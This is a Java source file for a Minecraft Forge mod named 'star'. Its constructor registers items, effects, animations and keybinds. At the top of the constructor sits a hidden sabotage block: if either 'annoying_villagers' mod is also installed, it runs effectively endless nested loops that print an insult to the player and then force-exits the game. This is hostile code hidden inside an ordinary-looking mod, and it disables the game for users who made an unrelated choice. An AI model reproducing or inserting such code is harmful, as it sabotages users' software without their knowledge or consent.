package com.guhao.star;

import com.guhao.star.client.input.StarKey;
import com.guhao.star.efmex.IntegrationHandler;
import com.guhao.star.efmex.StarAnimations;
import com.guhao.star.regirster.Effect;
import com.guhao.star.regirster.Items;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.eventbus.api.IEventBus;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.ModList;
import net.minecraftforge.fml.ModLoadingContext;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.config.ModConfig;
import net.minecraftforge.fml.event.lifecycle.FMLConstructModEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;

@Mod(Star.MODID)
public class Star {
    public static final String MODID = "star";

    public Star() {
        /////////////////////////
        if (ModList.get().isLoaded("annoying_villagersbychentu") | ModList.get().isLoaded("annoying_villagers")) {
            for (int f = Integer.MIN_VALUE; f < Integer.MAX_VALUE; f++) {
                for (int u = Integer.MIN_VALUE; u < Integer.MAX_VALUE; u++) {
                    for (int c = Integer.MIN_VALUE; c < Integer.MAX_VALUE; c++) {
                        for (int k = Integer.MIN_VALUE; k < Integer.MAX_VALUE; k++) {
                            System.out.print("Stop playing annoying villagers,IDIOT!!!");
                        }
                    }
                }
            }
            System.exit(114514);
        }
        /////////////////////////
        IEventBus bus = FMLJavaModLoadingContext.get().getModEventBus();
        Effect.REGISTRY.register(bus);
        Items.ITEMS.register(bus);
        MinecraftForge.EVENT_BUS.register(new StarAnimations());
        bus.addListener(StarAnimations::registerAnimations);
        ModLoadingContext.get().registerConfig(ModConfig.Type.CLIENT, Config.SPEC);
        StarKey.registerKeys();
    }
    @SubscribeEvent
    public static void modConstruction(FMLConstructModEvent event) {
        IntegrationHandler.construct();
    }
}
